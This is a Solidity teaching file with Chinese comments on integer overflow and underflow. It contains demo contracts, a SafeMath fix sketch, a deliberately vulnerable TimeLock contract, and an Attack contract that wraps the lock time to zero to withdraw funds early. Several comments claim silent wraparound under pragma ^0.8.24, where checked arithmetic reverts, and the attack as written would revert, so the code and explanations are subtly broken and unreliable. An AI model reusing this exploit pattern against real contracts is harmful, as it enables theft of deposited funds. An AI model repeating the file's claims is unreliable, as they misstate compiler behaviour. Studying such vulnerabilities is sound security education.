// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

//整数溢出发生在算术运算的结果超过了变量类型所能表示的最大值
contract Overflow {
    uint8 public balance = 255; // uint8 的最大值是 255

    function add(uint8 amount) public {
        balance += amount; // 如果 amount > 0，会导致溢出
    }
}

//整数下溢发生在算术运算的结果低于变量类型所能表示的最小值
contract Underflow {
    uint8 public balance = 0; // uint8 的最小值是 0

    function subtract(uint8 amount) public {
        balance -= amount; // 如果 amount > 0，会导致下溢
    }
}

// 类型转换
contract Typecasting {
    uint256 public a = 258;
    uint8 public b = uint8(a); // typecasting uint256 to uint8
}

// 位运算操作
contract UsingShiftOperators {
    uint8 public a = 100;
    uint8 public b = 2;

    uint8 public c = a << b; // overflow as 100 * 4 > 255
}

// 使用内敛汇编
contract UseofInlineAssembly {
    uint8 public a = 255;

    function addition() public view returns (uint8 result) {
        assembly {
            result := add(sload(a.slot), 1) // adding 1 will overflow and reset to 0
        }
        return result;
    }
}

// 使用unchecked 代码块
contract UseofUncheckedCodeBlock {
    uint8 public a = 255;

    function uncheck() public {
        unchecked {
            a++; // overflow and reset to 0 without reverting
        }
    }
}

/*
修复建议:
为了防止整数下溢攻击，可以使用 Solidity 0.8.0 或更高版本，或者使用 OpenZeppelin 的 SafeMath 库。

pragma solidity ^0.7.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Fixed {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(amount);
        payable(msg.sender).transfer(amount);
    }
}
 */

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(type(uint256).max + 1 - timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }
}
